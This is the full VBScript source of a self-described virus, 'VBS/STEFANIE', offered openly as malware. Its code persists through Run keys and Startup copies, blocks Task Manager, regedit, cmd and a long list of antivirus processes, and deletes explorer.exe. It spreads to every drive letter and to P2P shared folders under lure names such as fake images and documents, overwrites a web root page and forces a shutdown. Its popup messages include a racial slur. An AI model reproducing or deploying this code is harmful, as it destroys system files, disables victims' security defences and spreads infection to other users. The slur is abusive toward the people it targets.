' VBS/STEFANIE By [°K°]
Dim WshShell, FSO, VX, VirusLink
On Error Resume Next
  Set FSO = CreateObject("Scripting.FileSystemObject")
vbs = Wscript.ScriptFullName
Set WshShell = Wscript.CreateObject("Wscript.Shell")
 Set oUrlLink = WshShell.CreateShortcut("SteFanie.URL")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EmailName","ILoveSteFanie@Myspace.com"
regcreate "HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Login\Screen Name","Free SteFanie"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\[°K°]","[°K°]"
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SteFanie","SteFanie.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systray", "C:\WINDOWS\system\ILoveSteFanie.vbs"
oUrlLink.TargetPath = "http://myspace-291.vo.llnwd.net/00131/19/27/131127291_l.jpg"
oUrlLink.Save
FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\WINDOWS\Start Menu\Programs\Startup\Starup.vbs" 
FSO.CopyFile vbs, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\SteFanie.vbs" 
strDownloadedCode = obInet.OpenURL("http://myspace-291.vo.llnwd.net/00131/19/27/131127291_l.jpg")
WshShell.Run ("C:\Documents and Settings\Administrator\Desktop\SteFanie.URL")
a.run ("c:\windows\ping.exe -t -l 100000 http://myspace-291.vo.llnwd.net/00131/19/27/131127291_l.jpg")
'
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisableTaskMgr","1"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun","1"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","0x03ffffff"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu","1"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","1"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1","notepad.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2","regedit.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3","wordpad.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4","cmd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5","write.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\6","wuauclt.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\7","rstrui.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8","taskmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9","ntbackup.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\10","mcagent.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\11","mcvsshld.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\12","mcshield.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\13","mcvsescn.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\14","mcvsrte.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\15","DefWatch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\16","Rtvscan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\17","ccEvtMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\18","NISUM.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\19","ccPxySvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\20","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\21","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\22","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\23","LUALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\24","DRWEBUPW.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\25","AUTODOWN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\26","alogserv.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\27","RuLaunch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\28","Avconsol.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\29","PavFires.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\30","FIREWALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\31","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\32","Vshwin32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\33","VsStat.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\34","Avsynmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\35","ccApp.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\36","nopdb.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\37","OUTPOST.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\38","ICSSUPPNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\39","ICSUPP95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\40","ESCANH95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\41","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\42","ESCANHNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\43","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\44","AUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\45","AUTOTRACE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\46","AUTOUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\47","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\48","AVWUPD32.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\49","AVPUPD.EXE "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\50","CFIAUDIT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\51","UPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\52","symlcsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\53","MCUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\54","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\55","pavsrv50.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\56","SAVScan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\57","SNDSrvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\58","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\59","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\60","ccProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\61","SHSTAT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\62","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\63","UpdaterUI.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\64","VsTskMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\65","FrameworkService.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\66","LUCOMS~1.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\67","blackd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\68","bawindo.exe "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\69","AVENGINE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\70","APVXDWIN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\71","pavProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\72","navapw32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\73","IEXPLORE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\74","vpc32.exe"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","HAHA You Have The VBS/SteFanie Virus!!! By [°K°]"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","HAHA You Have The VBS/SteFanie Virus!!! By [°K°]"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systray", "C:\WINDOWS\system\SteFanie.vbs"
FSO.copyfile vbs, ("C:\WINDOWS\system32\drivers\etc\hosts.vbs"), ("# Copyright (c) 1993-1999 Microsoft Corp.")
FSO.copyfile vbs, "c:\windows\system32\drivers\etc\SteFanie.vbs"
FSO.copyfile vbs, "c:\windows\system\SteFanie.vbs"
FSO.copyfile vbs, "C:\Documents and Settings\Administrator\Desktop\SteFanie.vbs"
Fso.Copyfile "C:\windows\SteFanie.dls","C:\mirc\SteFanie.ini"
FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\WINDOWS\Start Menu\Programs\Startup\Starup.vbs" 
FSO.CopyFile vbs, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\SteFanie.vbs" 
FSO.CopyFile vbs, "C:\My Downloads\SteFanie.vbs" 
FSO.CopyFile vbs, "C:\My Shared Folder\SteFanie.vbs" 
FSO.CopyFile vbs, "C:\Inetpub\wwwroot\index.htm" 
FSO.CopyFile vbs, "A:\SteFanie.vbs"
FSO.CopyFile vbs, "B:\SteFanie.vbs"
FSO.CopyFile vbs, "G:\SteFanie.vbs"
FSO.CopyFile vbs, "H:\SteFanie.vbs"
FSO.CopyFile vbs, "I:\SteFanie.vbs"
FSO.CopyFile vbs, "J:\SteFanie.vbs"
FSO.CopyFile vbs, "K:\SteFanie.vbs"
FSO.CopyFile vbs, "L:\SteFanie.vbs"
FSO.CopyFile vbs, "M:\SteFanie.vbs"
FSO.CopyFile vbs, "N:\SteFanie.vbs"
FSO.CopyFile vbs, "O:\SteFanie.vbs"
FSO.CopyFile vbs, "P:\SteFanie.vbs"
FSO.CopyFile vbs, "Q:\SteFanie.vbs"
FSO.CopyFile vbs, "R:\SteFanie.vbs"
FSO.CopyFile vbs, "S:\SteFanie.vbs"
FSO.CopyFile vbs, "T:\SteFanie.vbs"
FSO.CopyFile vbs, "U:\SteFanie.vbs"
FSO.CopyFile vbs, "V:\SteFanie.vbs"
FSO.CopyFile vbs, "W:\SteFanie.vbs"
FSO.CopyFile vbs, "X:\SteFanie.vbs"
FSO.CopyFile vbs, "Y:\SteFanie.vbs"
FSO.CopyFile vbs, "Z:\SteFanie.vbs"
strDownloadedCode = obInet.OpenURL("http://myspace-291.vo.llnwd.net/00131/19/27/131127291_l.jpg")
PgDir = Shell.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
KaZaA = (PgDir & "\Kazaa\My Shared Folder") & "\"
fso.copyfile vbs, KaZaA & "Young teen.jpg.vbs"
fso.copyfile vbs, KaZaA & "Hot Girl.jpg.vbs"
fso.copyfile vbs, KaZaA & "Pussy.jpg.vbs"
fso.copyfile vbs, KaZaA & "sex.jpg.vbs"
fso.copyfile vbs, KaZaA & "big boobs.jpg.vbs"
fso.copyfile vbs, KaZaA & "Sex Tips.doc.vbs"
fso.copyfile vbs, KaZaA & "Lord of the rings.doc.vbs"
fso.copyfile vbs, KaZaA & "How To Rip DVDs.doc.vbs"
KL = (PgDir & "\KaZaA Lite\My Shared Folder") & "\"
fso.copyfile vbs, KL & "Young teen.jpg.vbs"
fso.copyfile vbs, KL & "Hot Girl.jpg.vbs"
fso.copyfile vbs, KL & "Pussy.jpg.vbs"
fso.copyfile vbs, KL & "sex.jpg.vbs"
fso.copyfile vbs, KL & "big boobs.jpg.vbs"
fso.copyfile vbs, KL & "Sex Tips.doc.vbs"
fso.copyfile vbs, KL & "Lord of the rings.doc.vbs"
fso.copyfile vbss, KL & "How To Rip DVDs.doc.vbs"
Morpheus = (PgDir & "\Morpheus\My Shared Folder") & "\"
fso.copyfile vbs, Morpheus & "Young teen.jpg.vbs"
fso.copyfile vbs, Morpheus & "Hot Girl.jpg.vbs"
fso.copyfile vbs, Morpheus & "Pussy.jpg.vbs"
fso.copyfile vbs, Morpheus & "sex.jpg.vbs"
fso.copyfile vbs, Morpheus & "big boobs.jpg.vbs"
fso.copyfile vbs, Morpheus & "Sex Tips.doc.vbs"
fso.copyfile vbs, Morpheus & "Lord of the rings.doc.vbs"
fso.copyfile vbs, Morpheus & "How To Rip DVDs.doc.vbs"
Grokster = (PgDir & "\Grokster\My Grokster") & "\"
fso.copyfile vbs, Grokster & "Young teen.jpg.vbs"
fso.copyfile vbs, Grokster & "Hot Girl.jpg.vbs"
fso.copyfile vbs, Grokster & "Pussy.jpg.vbs"
fso.copyfile vbs, Grokster & "sex.jpg.vbs"
fso.copyfile vbs, Grokster & "big boobs.jpg.vbs"
fso.copyfile vbs, Grokster & "Sex Tips.doc.vbs"
fso.copyfile vbs, Grokster & "Lord of the rings.doc.vbs"
fso.copyfile vbs, Grokster & "How To Rip DVDs.doc.vbs"
BearShare = (PgDir & "\BearShare\Shared") & "\"
fso.copyfile vbs, BearShare & "Young teen.jpg.vbs"
fso.copyfile vbs, BearShare & "Hot Girl.jpg.vbs"
fso.copyfile vbs, BearShare & "Pussy.jpg.vbs"
fso.copyfile vbs, BearShare & "sex.jpg.vbs"
fso.copyfile vbs, BearShare & "big boobs.jpg.vbs"
fso.copyfile vbs, BearShare & "Sex Tips.doc.vbs"
fso.copyfile vbs, BearShare & "Lord of the rings.doc.vbs"
fso.copyfile vbs, BearShare & "How To Rip DVDs.doc.vbs"
Set fso = CreateObject("Scripting.FileSystemObject")
Set k = fso.GetFile("c:\windows\explorer.exe")
k.Delete
Set fso = CreateObject("Scripting.FileSystemObject")
Set k = fso.GetFile("C:\Program Files\AIM\aim.exe")
k.Delete
If Day(Now()) = 2 or Day(Now()) = 13 or Day(Now()) = 20 Then
msgbox "Z+S 4 Ever"
End If
Const CDROM = 4
    On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
     For d = 0 to colCDROMs.Count - 1
           colCDROMs.Item(d).Eject 
Next

set owmp = nothing
set colCDROMs = nothing
if day(now()) = 13 and month(now()) = 1 then
msgbox "Happy B-Day SteFanie From Zack By [°K°]"
end if

msgbox "HAHA You Have The VBS/SteFanie Virus!!! By [°K°]"
Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 15 -c "+chr(34)+"HAHA You Have The VBS/SteFanie Virus!!! BY [°K°]"+chr(34)
wrte.Close()

Set shell=CreateObject("Wscript.Shell")
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\Source", "C:\SteFanie.html"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\SubscribedURL", "C:\SteFanie.html"
if day(now()) = 19 then
msgbox "Niggers Are Black"
end if
shell.Run windir+"\windows.cmd"
' VBS/STEFANIE By [°K°]